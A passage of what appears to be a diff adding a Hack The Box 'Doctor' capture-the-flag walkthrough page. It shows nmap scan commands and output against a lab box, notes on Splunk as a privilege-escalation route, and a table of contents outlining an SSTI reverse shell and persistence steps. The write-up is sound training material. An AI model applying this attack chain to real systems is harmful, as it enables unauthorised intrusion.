@@ -1,0 +1,2133 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.140.0">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Doctor HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Doctor HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/doctor-box/" title="./walkthroughs/doctor-box/">
+                        
+                            Doctor HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/forest-box/" title="./walkthroughs/forest-box/">
+                        
+                            Forest HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/driver-box/" title="./walkthroughs/driver-box/">
+                        
+                            Driver HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/timelapse-box/" title="./walkthroughs/timelapse-box/">
+                        
+                            Timelapse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/certified-box/" title="./walkthroughs/certified-box/">
+                        
+                            Certified HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
+                        
+                            Aero HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/administrator-box/" title="./walkthroughs/administrator-box/">
+                        
+                            Administrator HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
+                        
+                            Sauna HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
+                        
+                            Active HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
+                        
+                            Cicada HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
+                        
+                            Authority HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
+                        
+                            EvilCUPS HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
+                        
+                            Resolute HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
+                        
+                            Fuse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
+                        
+                            Cascade HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingasreproasting/" title="./articles/understandingasreproasting/">
+                        
+                            Understanding AS-REP Roasting Attacks: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingdownloadcradles/" title="./articles/understandingdownloadcradles/">
+                        
+                            Understanding PowerShell Download Cradles: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
+                        
+                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
+                        
+                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
+                        
+                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
+                        
+                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
+                        
+                            LDAPire: LDAP Enumeration Tool
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
+                        
+                            Automating Kali VM Setup with QEMU
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
+                        
+                            BloodServer: A Secure File Transfer Tool for Penetration Testers
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
+                        
+                            Attacking LDAP: Deep Dive &amp; Cheatsheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
+                        
+                            Attacking RPC: Deep Dive &amp; Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/editorial-box/" title="./editorial-box/">
+                        
+                            Editorial HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/doctor-box/" title="./doctor-box/">
+                        
+                            Doctor HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Doctor HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.21.12"
+                            >2024.21.12
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        13 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/easy/"
+                            class="tag-btn">
+                            Easy
+                        </a>
+                    
+                        <a
+                            href="/tags/linux/"
+                            class="tag-btn">
+                            Linux
+                        </a>
+                    
+                        <a
+                            href="/tags/ssti/"
+                            class="tag-btn">
+                            SSTI
+                        </a>
+                    
+                        <a
+                            href="/tags/splunk/"
+                            class="tag-btn">
+                            Splunk
+                        </a>
+                    
+                        <a
+                            href="/tags/persistence/"
+                            class="tag-btn">
+                            Persistence
+                        </a>
+                    
+                        <a
+                            href="/tags/web/"
+                            class="tag-btn">
+                            Web
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
+    
+
+    
+        Walkthroughs
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/doctor-box/" class="bread-btn">
+    
+
+    
+        
+            Doctor HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#doctor-hack-the-box-walkthrough-writeup">Doctor Hack The Box Walkthrough/Writeup:</a></li>
+    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#splunk-8089">Splunk: <code>8089</code>:</a></li>
+        <li><a href="#web-80">Web <code>80</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#getting-a-reverse-shell-via-ssti">Getting a reverse shell via SSTI:</a></li>
+        <li><a href="#discovering-our-user-is-part-of-the-adm-group">Discovering Our User is part of the adm group:</a></li>
+        <li><a href="#finding-a-clear-text-password-in-var-log-apache2-logs">Finding a clear text password in <code>/var/log/apache2</code> logs</a></li>
+        <li><a href="#enumerating-as-shaun">Enumerating as shaun:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#logging-into-splunk-universal-forwarder-as-shaun">Logging into splunk Universal Forwarder as shaun:</a></li>
+        <li><a href="#getting-root-using-splunkwhisperer2-to-exploit-the-universal-forwarder">Getting root using SplunkWhisperer2 to exploit the Universal Forwarder:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-persistence">4. Persistence:</a>
+      <ul>
+        <li><a href="#persistence-method-1-creating-a-cron-job-reverse-shell">Persistence Method 1: Creating a cron job reverse shell:</a></li>
+        <li><a href="#persistence-method-2-adding-an-ssh-key">Persistence Method 2: Adding an SSH key:</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="doctor-hack-the-box-walkthrough-writeup">Doctor Hack The Box Walkthrough/Writeup:</h2>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/Doctor">https://app.hackthebox.com/machines/Doctor</a></li>
+</ul>
+<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</h2>
+<ul>
+<li>
+<p><strong>Variables</strong>:</p>
+<ul>
+<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
+<ul>
+<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
+<ul>
+<li><code>$box</code> = The IP of the box</li>
+<li><code>$pass</code> = Passwords I have access to.</li>
+<li><code>$user</code> = current user I am enumerating with.
+<ul>
+<li>Depending on where I am in the process this can change if I move laterally.</li>
+</ul>
+</li>
+<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
+<li><code>$machine</code> = the machine name e.g. <code>DC01</code></li>
+</ul>
+</li>
+<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Wordlists</strong>:</p>
+<ul>
+<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
+<ul>
+<li>I also use these additional wordlists:
+<ul>
+<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
+<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="nmap">NMAP:</h3>
+<h4 id="basic-scans">Basic Scans:</h4>
+<ul>
+<li><strong>Basic TCP Scan</strong>:
+<ul>
+<li><code>nmap $box -Pn -oA TCPbasicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>🕙 13:37:21 zsh ❯ nmap $box -Pn -oA TCPbasicScan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-12-20 13:37 GMT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.2.21
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.041s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>8089/tcp open  unknown</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Initial thoughts</strong>:
+<ul>
+<li>SSH, HTTP and what could be Splunk running on 8089.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="comprehensive-scans">Comprehensive Scans:</h4>
+<ul>
+<li><strong>In depth scan TCP</strong>:
+<ul>
+<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  <span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-12-20 13:38 GMT
+</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.2.21
+</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">65532</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  PORT     STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>  22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  | ssh-hostkey:
+</span></span><span style="display:flex;"><span>  |   <span style="color:#ae81ff">3072</span> 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |   <span style="color:#ae81ff">256</span> 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_  <span style="color:#ae81ff">256</span> 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  80/tcp   open  http     Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  |_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_http-title: Doctor
+</span></span><span style="display:flex;"><span>  8089/tcp open  ssl/http Splunkd httpd
+</span></span><span style="display:flex;"><span>  |_http-title: Splunkd
+</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SplunkServerDefaultCert/organizationName<span style="color:#f92672">=</span>SplunkUser
+</span></span><span style="display:flex;"><span>  | Not valid before: 2020-09-06T15:57:27
+</span></span><span style="display:flex;"><span>  |_Not valid after:  2023-09-06T15:57:27
+</span></span><span style="display:flex;"><span>  |_http-server-header: Splunkd
+</span></span><span style="display:flex;"><span>  | http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry
+</span></span><span style="display:flex;"><span>  |_/
+</span></span><span style="display:flex;"><span>  Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>  Device type: general purpose|specialized
+</span></span><span style="display:flex;"><span>  Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Linux 5.X|4.X|2.6.X <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Crestron 2-Series <span style="color:#f92672">(</span>86%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:crestron:2_series
+</span></span><span style="display:flex;"><span>  Aggressive OS guesses: Linux 5.0 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 4.15 - 5.8 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Linux 5.0 - 5.4 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Linux 5.3 - 5.4 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Linux 5.0 - 5.5 <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>, Crestron XPanel control system <span style="color:#f92672">(</span>86%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>  Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 172.25 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Findings</strong>:
+<ul>
+<li>System is running apache &amp; ubuntu.</li>
+<li>Interestingly it&rsquo;s running Splunk, which is a log analytics tool used to gather, analyze and visualize data, Splunk is often used for security monitoring and business analytics.
+<ul>
+<li>What is also good is I know it&rsquo;s possible to get RCE via Splunk if we can get access to the console, also splunk is often running with elevated privileges as it&rsquo;s dealing with system logs. This could be a viable privesc path if we can get access.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="splunk-8089">Splunk: <code>8089</code>:</h3>
+<ul>
+<li>
+<p><a href="https://kinneygroup.com/blog/Splunk-default-ports/">This is a great resources which shows Splunk&rsquo;s default ports</a> and what they are used for:</p>
+<ul>
+<li>As we can see it&rsquo;s most likely a management or API port:
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-21-064514_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
